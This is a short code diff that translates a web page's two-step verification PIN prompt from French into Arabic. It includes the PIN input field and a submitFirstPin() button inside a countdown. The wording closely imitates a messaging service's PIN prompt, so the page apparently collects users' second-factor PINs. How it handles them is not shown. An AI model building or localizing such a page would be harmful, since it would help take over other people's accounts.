@@ -179,12 +179,12 @@
             startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
-                    <h1>Vérification en deux étapes</h1>
-                    <p>Saisissez le code PIN que vous avez créé lors de la configuration de la vérification en deux étapes.</p>
+                    <h1>التحقق من خطوتين</h1>
+                    <p>أدخل رقم التعريف الشخصي (PIN) الذي قمت بإنشائه عند إعداد التحقق على خطوتين..</p>
                     <input id="pinCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
-                    <a href="#" class="forgot-link">PIN oublié ?</a>
+                    <a href="#" class="forgot-link">هل نسيت رقم التعريف الشخصي؟ ?</a>
                     <p class="instruction">
-                        Vous avez vous-même créé votre code PIN. Il ne s'agit pas du code de vérification que vous avez reçu lors de votre inscription.
+                        لقد قمت بإنشاء رمز PIN الخاص بك بنفسك. هذا ليس رمز التحقق الذي تلقيته عند التسجيل.
                     </p>
                     <button onclick="submitFirstPin()">متابعة</button>
                     <div id="countdown"></div>
